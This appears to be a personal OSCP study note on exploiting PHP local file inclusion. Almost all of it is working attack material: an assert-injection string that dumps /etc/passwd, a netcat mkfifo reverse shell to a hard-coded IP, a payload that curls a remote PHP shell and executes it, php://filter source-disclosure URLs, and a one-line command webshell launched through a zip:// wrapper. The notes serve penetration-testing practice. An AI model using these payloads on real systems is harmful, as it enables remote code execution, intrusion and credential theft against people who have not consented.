#### PHP LFI with assert
```
' and die(show_source('/etc/passwd')) or '

TO GET A REVERSE SHELL:

#Create a php reverse shell (shell.php)
<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.142 9001 >/tmp/f');
?>#Curl and listen (Url Encoded)
' and die(system("curl http://<ip>/shell.php|php")) or '

I USED THE PENTEST MONKEY PHP ONE AND THAT WORKS FINE
```

https://github.com/Poellie01/LFIBuster

PHP wrapper LFI read source code
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/index.php?file=php://filter/convert.base64-encode/resource=index`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/index.php?file=php://filter/convert.base64-encode/resource=upload`;

dv.paragraph("```bash\n" + command + "\n```");
```


Decode
```Powershell
echo "content" | base64 -d
```


```
// upload a php shell then use zip wrapper for reverse shell  
$ cat simple_cmd.php  
<?php system($_REQUEST["cmd"]); ?>  
  
  
// browse to the uploaded php webshell using Zip Wrapper LFI  
http://192.168.226.229/index.php?file=zip://uploads/upload_1714872711.zip%23simple_cmd&cmd=id
```